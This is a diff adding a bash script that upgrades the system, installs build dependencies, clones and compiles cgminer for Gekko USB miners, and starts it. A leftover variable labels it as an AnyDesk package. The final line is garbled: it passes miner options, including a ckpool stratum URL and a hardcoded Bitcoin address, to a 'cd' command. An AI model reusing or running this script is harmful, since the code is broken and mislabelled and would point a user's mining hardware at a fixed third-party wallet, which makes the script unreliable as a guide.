@@ -1,0 +1,38 @@
+#!/bin/bash
+
+DIRECTORY="$(dirname "$(dirname "$( cd "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )")")"
+
+function error {
+  echo -e "\\e[91m$1\\e[39m"
+  exit 1
+}
+
+# file name for future updates
+filename='anydesk_6.0.1-1_armhf'
+
+
+
+# update your system
+sudo apt-get update
+# upgrade your system
+sudo apt-get upgrade -y
+# Install Essantials, git, autoconf, automake, libtool, pkg-config, libcurl4-openssl-dev, libudev-dev, libusb-1.0-0-dev, libncurses5-dev
+sudo apt-get install -y build-essential git autoconf automake libtool pkg-config libcurl4-openssl-dev libudev-dev libusb-1.0-0-dev libncurses5-dev
+
+
+
+# clone git
+git clone https://github.com/vthoang/cgminer.git
+
+# compile it
+cd cgminer
+
+# Unbuntu 16.04.1 LTS oder höher
+CFLAGS="-O2 -march=native" ./autogen.sh --enable-gekko
+make -j 2
+
+./cgminer -n
+
+
+cd ~/mining/2pac/cgminer/cgminer -o stratum+tcp://pool.ckpool.org:3333 -u 1BURGERAXHH6Yi6LRybRJK7ybEm5m5HwTr -p x --suggest-diff 32 --gekko-2pac-freq 150
+
